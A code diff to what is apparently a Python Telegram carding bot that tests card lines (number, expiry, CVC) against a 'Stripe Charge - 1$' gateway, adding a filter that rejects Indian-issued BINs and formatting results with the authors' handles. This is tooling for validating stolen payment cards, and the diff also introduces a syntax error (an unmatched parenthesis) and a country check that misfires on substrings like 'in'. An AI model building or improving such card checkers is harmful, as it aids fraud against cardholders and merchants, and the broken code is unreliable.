@@ -178,6 +178,30 @@ def get_country_emoji(country_code):
     except:
         return ''
 
+def is_indian_card(bin_info):
+    """Check if card is from India"""
+    country = bin_info.get('country', '').lower()
+    
+    # Check for Indian country names in various formats
+    indian_indicators = [
+        'india', 
+        'indian', 
+        'in',  # Country code
+        'bharat',
+        'hindustan'
+    ]
+    
+    for indicator in indian_indicators:
+        if indicator in country:
+            return True
+    
+    # Check emoji if country name is not clear
+    emoji = bin_info.get('emoji', '')
+    if '🇮🇳' in emoji:
+        return True
+    
+    return False
+
 def extract_error_from_response(response_text):
     """Extract error message from response text - FIXED FOR EMPTY RESPONSES"""
     try:
@@ -205,7 +229,7 @@ def extract_error_from_response(response_text):
                     else:
                         return str(error_msg)
                 
-                if 'data' in data and isinstance(data['data'], dict) and 'error' in data['data']:
+                if 'data' in data and isinstance(data['data'], dict) and 'error' in data['data']):
                     error_data = data['data']['error']
                     if isinstance(error_data, dict) and 'message' in error_data:
                         return str(error_data['message'])
@@ -314,6 +338,24 @@ def test_charge(cc_line):
         
         # Get BIN information FIRST (before any other operations)
         bin_info = get_bin_info(ccn[:6])
+        
+        # Check if card is from India - BLOCK IT IMMEDIATELY
+        if is_indian_card(bin_info):
+            elapsed_time = time.time() - start_time
+            return f"""
+⛔ BIN BANNED
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ BIN BANNED ❌
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
         
         # YOUR ORIGINAL STRIPE API LOGIC
         headers_stripe = {
